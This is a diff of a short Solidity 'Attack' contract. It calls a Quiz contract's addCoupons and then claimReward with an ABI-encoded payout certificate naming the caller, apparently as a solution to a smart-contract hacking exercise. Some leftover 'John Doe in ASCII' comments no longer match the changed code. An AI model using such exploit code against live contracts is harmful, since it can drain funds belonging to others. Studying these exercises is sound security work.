@@ -10,6 +10,7 @@ import "./Quiz.sol";
 contract Attack {
     Quiz public quiz;
     string[] array = ["this", "is", "payload"];
+    
 
     constructor(address _quiz) {
         quiz = Quiz(payable(_quiz));
@@ -17,11 +18,13 @@ contract Attack {
 
     function attack()external {
         quiz.addCoupons(array);
-        quiz.claimReward("givememoney");
+        bytes memory encPayoutCertificate = abi.encode(Quiz.PayoutCertificate("this", msg.sender));
+        quiz.claimReward(encPayoutCertificate);//John Doe in ASCII  
     }
 
-    function withdraw()external payable{
-       quiz.claimReward("4a6f686e20446f65"); //John Doe in ASCII
+     function withdraw()external payable{
+       bytes memory encPayoutCertificate = abi.encode(Quiz.PayoutCertificate("this", msg.sender));
+       quiz.claimReward(encPayoutCertificate); //John Doe in ASCII
     }
 
 }
